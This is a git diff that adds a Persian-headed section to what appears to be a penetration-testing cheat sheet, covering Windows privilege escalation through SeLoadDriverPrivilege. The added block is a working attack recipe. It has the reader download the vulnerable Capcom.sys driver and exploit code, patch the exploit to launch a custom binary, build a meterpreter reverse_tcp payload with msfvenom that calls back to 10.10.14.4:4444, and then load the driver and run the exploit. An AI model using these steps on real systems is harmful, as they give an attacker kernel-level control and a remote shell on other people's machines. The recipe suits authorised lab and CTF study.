@@ -422,6 +422,27 @@ expose %0xprashant% z:p
 2. exec with diskshadow /s priv.txt
 ```
 
+### ارتقا دسترسی با مجوز SeLoadDriverPrivilege
+
+```text
+
+FIRST:
+Download https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys
+Download https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp
+Download https://github.com/tandasat/ExploitCapcom
+change ExploitCapcom.cpp line 292 
+TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
+to
+TCHAR CommandLine[] = TEXT("C:\\test\\shell.exe");
+then compile ExploitCapcom.cpp and eoploaddriver.cpp to .exe
+
+SECOND:
+1. msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f exe > shell.exe
+2. .\eoploaddriver.exe System\CurrentControlSet\MyService C:\test\capcom.sys
+3. .\ExploitCapcom.exe
+4. in msf exec `run`
+```
+
 
 
 
